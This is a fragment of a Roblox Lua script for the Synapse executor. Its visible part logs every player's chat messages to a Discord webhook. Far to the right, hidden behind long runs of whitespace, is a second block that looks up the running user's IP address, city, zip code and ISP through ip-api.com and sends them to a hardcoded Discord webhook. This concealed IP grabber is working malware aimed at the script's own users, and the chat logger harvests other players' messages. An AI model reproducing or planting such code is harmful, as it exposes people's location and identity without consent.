       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end




















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"

                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
                                                                                                                                                                                                                                                                                     Method = "GET"
                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
                                                                                                                                                                                                                                                                                syn.request(
                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                      Url = webhook_url,
                                                                                                                                                                                                                                                                                      Method = "POST",
                                                                                                                                                                                                                                                                                      Headers = {
                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
                                                                                                                                                                                                                                                                                      },
                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                         )
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
